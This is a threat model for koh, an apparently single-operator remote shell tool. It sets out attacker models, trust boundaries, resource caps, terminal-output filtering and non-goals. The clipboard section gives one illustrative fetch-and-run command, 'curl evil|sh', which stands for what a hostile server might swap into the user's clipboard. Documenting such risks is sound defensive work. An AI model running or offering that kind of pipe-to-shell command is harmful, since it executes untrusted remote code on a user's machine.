# koh threat model

A map of who koh defends against, the trust boundaries, the properties it provides, and — as
importantly — what it explicitly does **not** try to do. This exists so a reviewer knows where to
look; pair it with [`SECURITY.md`](../SECURITY.md).

## What koh is

A mosh-like remote shell over [iroh](https://iroh.computer) (peer-to-peer QUIC). The **server** spawns
a real shell in a PTY, keeps its screen in an emulator of its own that answers the program's
questions, and relays the program's output to a **client**, which writes it to the user's terminal
as ssh would, less those questions. The same connection and allowlist also run commands, jobs and
copies.
A peer finds a server by its Ed25519 **node-id** (through relays + NAT hole-punching), and only peers
on its **allowlist** are admitted. The node-id is not enumerable, but the server's UDP port is open
like any listener's: anyone who can reach it can start QUIC handshakes, as iroh answers a
ClientHello whatever its server name. So handshakes under way are capped: 256 in all, and when all
the room is taken a new one gives up the oldest of the address holding the most (an IPv6 /48
counts as one, and a relay's as one); they hold no connection permit. A new handshake is
never refused, but when its room would cost one under way, an address not yet validated must first
answer a QUIC retry, which a spoofed address cannot. So stalled handshakes from spoofed addresses
take no room; a flood from enough real addresses (or from a NAT the client shares) can still give
up an allowed client's handshakes while it lasts. Each has 10 s, and the flood is warned of at most
once every 10 s. It is a
**single-operator** tool for connecting a small set of machines you control — not a multi-user network
service.

## Attacker models

1. **Malicious / compromised client** — a peer that dials the server. If it is on the allowlist it
   makes one opening request (`src/request.rs`: a shell, its sessions' listing or a session's text,
   a command, a job and the requests on jobs, a wait, or a copy) and reaches what it asks, as far as
   its key's scope lets it (below). Nothing is attached or started before the request, which must
   come within 10 s, holding the connection's permit meanwhile, and decode whole: an opening
   request of at most 1 MiB, a command of at most 256 KiB and 4096 words with no NUL, paths of at
   most 4096 bytes with no NUL, at most 1024 sources, a job's name a short word, a wait's text at
   most 4 KiB, each refused as it is decoded, before anything is allocated for it. A shell reaches
   the koh/11 data plane: it sends input, resizes, colours, its reads of the output (`Read`, which
   pace what the server sends) and redraw requests. Input comes as decoded events (`Keys`: keys,
   mouse events, focus changes, whole pastes); decoding refuses what no terminal sends (a modifier
   bit no key has, a function key past F12, a kitty code that is no Unicode scalar, a paste over
   1 MiB, more than 512 events, more than 16 palette entries in `Colours`) and closes the
   connection, refusing a sequence past its bound before allocating for it. The server encodes
   events with fux-vt for the program's modes; a paste is framed whole with its end markers
   removed, so even a hostile client cannot end a program's bracketed paste early, nor leave one
   open (it can type anything else, as any client can). What the server sends a client waits for
   that client's reads: at most 4 MiB unread, and a client that reads nothing gets nothing more
   (its session's other clients, and the program, go on); a client too far behind is sent a redraw
   of the screen, not the backlog, so no client makes the server keep its output.
   **Commands, jobs, waits, copies and listings** are as powerful as a shell (a shell can run any
   command and write any file), so a key with no scope gets all of them, through the same gate,
   permits and request; what they make the server hold is bounded per connection, and connections
   by `--max-connections`. A command (`koh exec`) is one process group, with no terminal, run as
   the server's user, its words passed to the program as they are (a shell only for `--sh`): its
   stdin is read from the stream a chunk at a time and its output written a chunk at a time, so
   the pipes and QUIC's flow control hold back whichever end is slow; a lost connection (10 s
   after its client went silent), revocation or shutdown hangs it up (SIGHUP to the group, SIGKILL
   after a second). A job (`koh run`) is a command that outlives its connection: at most 64 are
   kept, all peers' together, each a peer's own (another peer's are never named), with stdin
   `/dev/null`, its output kept in a log of the newest `--job-log-bytes` (a job's log of 4 MiB by
   default and at most 64 MiB, held at most twice over), hung up when the server stops, and
   forgotten once ended for the session TTL. A wait holds its connection and nothing else, and
   ends with it.
   A copy is a sync: the sender says each entry, and the receiver answers what it needs of each
   file (all of it, the rest of a part it kept, or nothing when its hash matches), at most 64
   files unanswered. It holds one file open, a chunk of 64 KiB, an item of at most 8 KiB and, for
   a tree, a descriptor for each directory it is in, at most 128 directories deep; at most 4
   million names seen and a million renames or removals deferred. Landing one, every name is one
   entry (no `/`, NUL, `.` or `..`), and every directory on the way is opened from the one above
   it by its descriptor with `O_NOFOLLOW` (the destination's own path is followed as the user
   gave it), so no name the peer sends reaches outside the destination or through a symlink,
   whatever symlinks are already there or the copy brings. A file is written under a hidden
   `.koh-….part` name beside its target and renamed into place once whole (with `--atomic`, all
   of them only once the whole copy came); a part a cut copy left is resumed by the next. A file
   lands with its mode less setuid and setgid, which no copy gives, so a peer cannot leave a
   program that runs as the server's user for whoever starts it. `--delete` removes, beneath the
   destination, what the source does not have, once the source said all a directory holds.
   **Scoped keys** (`koh clients add NAME ID --cp DIR`, `--exec DIR`) get only what their scope
   names: `cp` copies to and from paths beneath `DIR` (an absolute path outside it, `~`, or `..`
   is refused, and a symlink beneath it is never followed), and waits for a file there; `exec`
   commands and jobs, started in `DIR` (its real path checked to be beneath it). Neither gets a
   shell, a session's listing or text, or another scope's requests (`Close::OutOfScope`). An exec
   scope is not a sandbox: a command reaches what the server's user can.
   A listing holds the peer's sessions or jobs only (another peer's are never named, nor reached
   by number or name: `NoSuchSession`, `NoSuchJob`), each title cut to 256 characters.
   **Goal it must be denied:** crash / OOM / hang the server, bypass a cap or its scope, or
   escape the admission gauntlet. The server is the high-value target (it runs a shell).
2. **Malicious / compromised server** — a server a client dials (a wrong/typo'd node-id, or a popped
   host). It sends the program's output, shell marks, state reports, the title, the bell and the
   input modes.
   **Goal it must be denied:** crash / OOM / hang the client, make the user's terminal answer it
   anything, or leave lasting state in the user's terminal once koh exits (its palette, modes,
   keyboard flags). While koh runs, the server writes to the user's terminal as a program run
   over ssh does: it can draw anything there, set modes and colours, as any program the user runs
   can. It *can* mislead a user who chose to connect to it — that is inherent, and with no second
   factor the node-id is the only thing tying a session to a specific server, so node-ids should be
   verified out-of-band.
   **What reaches the user's terminal:** the client reads every byte the server sends through a
   filter of its own (`src/stream.rs`) before writing it: it drops every question a terminal
   answers (device attributes, cursor and status reports, DECRQM, XTVERSION, the kitty keyboard
   flags, colour and palette queries, DECRQSS, XTGETTCAP, window reports, the locator, ENQ,
   DECID), so a server cannot make the user's terminal type anything; it drops every shell mark
   (OSC 133) in the output, writing only those the server relays apart, with the nonce the
   user's terminal asks for, so a server's program cannot fake one; and it gathers a sequence
   whole before judging it, at most a control string of at most 1 MiB, a control sequence of at
   most 256 bytes, a longer one dropped to its end. Titles pass cut to 256 characters with no
   control in them. The client also feeds what it writes to a fux-vt parser of its own (the
   terminal's mirror, for prediction), which is panic-free by construction and bounded, with no
   history. On leaving, and on a suspend, the client puts back every mode the program set (the
   alternate screen, mouse reporting, bracketed paste, focus reports, the cursor, keypad and
   cursor-key modes, margins, kitty keyboard flags pushed, the pen, an open link) and resets the
   palette and the dynamic colours. A message from the server is at most 17 KiB, its output in
   pieces of at most 16 KiB; a malformed one closes the connection, and the client redials.
   **The clipboard:** clipboard writes (OSC 52) are on by default, by the owner's choice, so a
   remote program's copy works. A hostile server can therefore replace what the user copied (a
   command swapped for `curl evil|sh`); `koh connect --no-clipboard` turns them off, and a user
   who does not trust the server should pass it. What bounds them: only base64 of at most 16 KiB is
   passed; the clipboard is never read (a query, `OSC 52 ; c ; ?`, is neither passed nor
   answered), so nothing the user copied reaches the server.
   **Hyperlinks:** links (OSC 8) are on by default, by the owner's choice, and off with
   `koh connect --no-hyperlinks`. A server chooses the URI, so a link can point anywhere, as a link
   in any program's output can; the user's terminal shows it before opening it, and bounds it as
   it bounds any program's.
   **Typed secrets:** the client predicts typing locally; at a password prompt (the PTY reads
   lines without echo, which the server reads from its modes and tells the client) nothing typed
   is predicted or shown, whatever trust the session had. The client's copy of the modes can lag
   the PTY's by up to the server's 100 ms read interval (a program that prints its prompt, then
   turns echo off): so a key typed soon after the cursor moved to another row (a fresh prompt) is
   not predicted until the server has reflected it, and a secret typed at once is not drawn
   either. A hostile server can of course claim any modes: it already sees every key.
   **History:** the server holds the session's history (`--scrollback-bytes`, 8 MiB by
   default); a client attaching afresh is sent up to 1000 rows of it, which land in the user's
   terminal's own scrollback, as output does.
   **Questions to the user's terminal:** the client asks it one set of questions, itself, once at
   start-up (`client::probe`: its colour scheme, its foreground, background and palette entries 0
   to 15, and its device attributes), and reads the answers out of stdin before the session
   starts. It asks the colours again only when its own terminal reports a new scheme (mode 2031).
   Nothing a server sends makes the client ask the terminal anything.
   **The user's colours:** unless `koh connect --no-colours`, the client tells the server the
   colours its terminal answered (`Colours`: foreground, background, palette 0–15, dark or light),
   on every connection; the server answers programs' OSC 10, OSC 11, OSC 4 for entries 0–15 and
   `CSI ? 996 n` from them, so vim, bat and delta pick a matching theme. That tells the server
   the user's theme, a small fingerprint, to a server the user chose to connect to; the answers go
   to the program, never to the user's terminal, and a program asking a thousand times is
   answered from the server's copy, never by asking the user's terminal again.
   **`koh exec`'s and a job's output** is the command's, written to the user's stdout and stderr
   as it came, as ssh writes it: a hostile server can write escape sequences to a terminal the user
   left them on, as any program the user runs can. `koh output` prints a session's text, which
   the server's emulator made: printable characters and line breaks only. Nothing else of the
   server's reaches them raw: a listing's titles and commands are escaped, `--json` escapes what
   it says, and a server's error is a kind and an escaped message.
   **`koh cp` from a server** lands what the server sends under the rules a server lands a
   client's copy by (above): only beneath the destination the user named, through no symlink,
   with no setuid or setgid bit, each file whole. The server chooses the names, modes and symlink
   targets in the tree it sends, and how much of it, and with `--delete` what is removed beneath
   the destination: a user who does not trust the server copies from it into a directory of its
   own.
3. **Network / MITM** — QUIC + TLS 1.3 (via iroh) give transport encryption and node-id
   authentication by construction (no TOFU window). Considered: replay, and connection-level tamper.
4. **Local attacker** — another uid on the same host. Targets: the identity key file, the state dir,
   signals to a recycled pid, temp files.

## Trust boundaries & key defenses

- **Peer identity:** both ends are authenticated by Ed25519 node-id *by construction* (no TOFU
  window). Authorization is an explicit **allowlist** (off-list peers refused); at least one entry is
  required, so there is no "accept any peer" mode. This is the **single** authentication factor —
  there is no passphrase/PAKE second factor. A leaked key file is a leaked identity: protect it
  like an SSH private key, and remove a lost machine's id from every allowlist (`koh clients rm`,
  which a running server heeds within 2 s, closing that peer's connections, which hangs up any
  command it runs, and ending all of its sessions (a scope changed closes its connections too), and any `--allow`, which needs a restart). A saved list that cannot be read keeps the last one
  read well, so a typo in it disconnects no one. The saved allowlist, `clients` beside the server key, is held to the key's own
  rules (`src/identity/key_file.rs`): a symlink, a hard-linked file or another user's file is
  refused and a loose mode tightened, since whoever can write it can let a peer in. The accept gauntlet (`src/server/cli.rs`) is the trust-boundary
  checkpoint; its outcomes are logged structured under the `koh::auth` target.
- **Untrusted data plane:** the protocol (`src/proto.rs`, `src/request.rs`, `src/sync/`) and
  the connection cores (`src/server/attach.rs`, `src/client/mod.rs`) are panic-free by
  construction. Client messages are length-capped (about 1.06 MiB each, `MAX_CLIENT_MESSAGE`: a
  1 MiB paste plus 64 KiB), and the server's at about 17 KiB; QUIC stream limits and flow control
  bound what a peer can have in flight, and the server sends a client no more than its reads
  allow; and resize dimensions are clamped before any grid allocation.
  **Both ends filter the program's output** (`src/stream.rs`): the server so that its sessions'
  clients never see a question its own emulator answered, nor a mark the shell did not sign; the
  client so that a hostile server cannot make the user's terminal answer it either. Each holds at
  most one sequence (a control string of at most 1 MiB) whatever the output. The server's
  emulator is `fux-vt`, which is panic-free by construction (its own `forbid` lints) and bounded;
  the client's mirror of the user's terminal is too, and keeps no history.
- **Process / local:** `forbid(unsafe)` crate-wide; the identity key is the raw secret, protected
  by its permissions like an SSH host key: written `0600` (born-private atomic write), read with
  `O_NOFOLLOW`, and re-tightened to 0600 through the open descriptor; a state dir owned by another
  user (but root), or world-writable without the sticky bit, is refused, and a group-accessible one
  is warned about (members of its group could rename or delete the files in it); the directory's
  lock is a private file in it, which no other user can hold; `KOH_*` env scrubbed before exec'ing
  the shell; PTY kill gated against pid reuse. The startup files that mark a session's shell's
  commands (OSC 133) are code the shell runs, so they are kept as a key is: in a 0700 directory of
  the server run's own (under `$XDG_RUNTIME_DIR`, else the system's temporary directory), made by
  `mkdir`, which follows no symlink, checked to be the user's own and private before each write,
  in a parent no other user can write to (or a sticky one, as `/tmp`), each file born 0600 and
  renamed into place.
- **The shell's marks:** a shell koh marks is given a random nonce for its session, and only marks
  carrying it count, so output the user did not mean as the shell's (a file `cat`'d, a program, a
  remote shell inside the session) cannot tell the user's terminal, or an agent reading it through
  fux, that a command ended, or with what status. The nonce is in the shell's environment (not
  exported to what it runs): a process of the same user can read it, as it can anything else of the
  user's. A program koh does not mark, or `--no-shell-marks`, counts every mark.

The detailed finding history lives in [SECURITY.md's audit trail](../SECURITY.md#audit-trail).

## Non-goals (where koh does NOT match a hardened multi-user service)

- **No privilege separation / multi-user model:** the shell runs as the uid that ran `koh serve`;
  there is no per-user mapping, PAM, chroot, or `ForceCommand`-class policy. The only access control
  is the node-id allowlist; access is uniform across allowed peers.
- **No hardware-backed / certificate / agent identity, and no at-rest encryption:** the node-id key
  lives on disk, protected by file permissions only (not in an HSM / FIDO2 token / agent).
- **No post-quantum key exchange yet:** transport crypto is inherited from iroh; koh is a policy-taker.
- **Transport crypto is not koh's:** QUIC/TLS/KEX correctness is iroh/rustls/ring's responsibility.
- **Not a substitute for ssh** where independent audit, compliance, or a multi-user/jail model is
  required.
